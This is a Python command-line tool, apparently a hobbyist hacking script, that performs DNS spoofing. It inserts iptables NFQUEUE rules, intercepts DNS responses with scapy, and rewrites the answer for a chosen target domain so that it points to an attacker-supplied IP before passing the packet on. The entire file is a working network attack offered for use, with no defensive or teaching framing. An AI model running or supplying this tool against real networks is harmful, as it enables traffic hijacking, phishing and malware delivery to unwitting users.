#!/usr/bin/env python
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
import scapy.all as scapy
import netfilterqueue
import argparse
import subprocess
from colorama import init, Fore		# for fancy/colorful display

class DNS_Spoofer:
    def __init__(self):
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.RED = Fore.RED
        self.Cyan = Fore.CYAN
        self.Yellow = Fore.YELLOW
        self.RESET = Fore.RESET


    def arguments(self):
        try:
            parser = argparse.ArgumentParser()
            parser.add_argument('-t', '--target', dest='target', help='Specify The Target Site')
            parser.add_argument('--spoofed-ip', dest='ip', help='Specify The IP With You Want TO Spoof')
            parser.add_argument('--queue-num', dest='queue', help='Specify The Queue Number For Iptables')
            values = parser.parse_args()
            if not values.target:
                parser.error('\n{}[-] Please Specify The Target Site {}'.format(self.RED, self.RESET))
            if not values.ip:
                parser.error('\n{}[-] Please Specify The Spoofed IP {}'.format(self.GREEN, self.RESET))
            if not values.queue:
                parser.error('\n{}[-] Please Specify The Queue Number {}'.format(self.Yellow, self.RESET))
            return values
        except Exception:       # Gives unexpected exception so use Exception here
            pass

    def process_packet(self, packet):
        option = self.arguments()  # function call
        scapy_packet = scapy.IP(packet.get_payload())  # make scapy packet
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            if option.target in qname:
                print('{}[+] Spoofing Target ...{}'.format(self.GREEN, self.RESET))
                answer = scapy.DNSRR(rrname=qname, rdata=option.ip)

                new_packet = self.spoofing_target(scapy_packet, answer) # function call

                packet.set_payload(str(new_packet))

        packet.accept()

    def spoofing_target(self, packet, answer):
        packet[scapy.DNS].an = answer
        packet[scapy.DNS].ancount = 1

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].len
        del packet[scapy.UDP].chksum
        return packet

    def start(self):
        try:
            values = self.arguments()
            subprocess.call(['clear'])

            print('{}\n\n\t\t\t\t\t#########################################################{}'.format(self.Cyan, self.RESET))
            print('\n{}\t\t\t\t\t#\t    Spoofing Domain Name System (DNS)\t\t#\n{}'.format(self.Cyan, self.RESET))
            print('{}\t\t\t\t\t#########################################################{}\n\n'.format(self.Cyan, self.RESET))

            queue = netfilterqueue.NetfilterQueue()
            print('\n{}Enable iptables...{}\n'.format(self.Yellow, self.RESET))
            subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num ' + str(values.queue), shell=True)
            subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num ' + str(values.queue), shell=True)
            queue.bind(int(values.queue), self.process_packet)
            queue.run()
        except KeyboardInterrupt:
            print('\n{}Flush Iptables...{}'.format(self.Yellow, self.RESET))
            subprocess.call('iptables --flush', shell=True)

if __name__ == "__main__":
    obj = DNS_Spoofer()
    obj.start()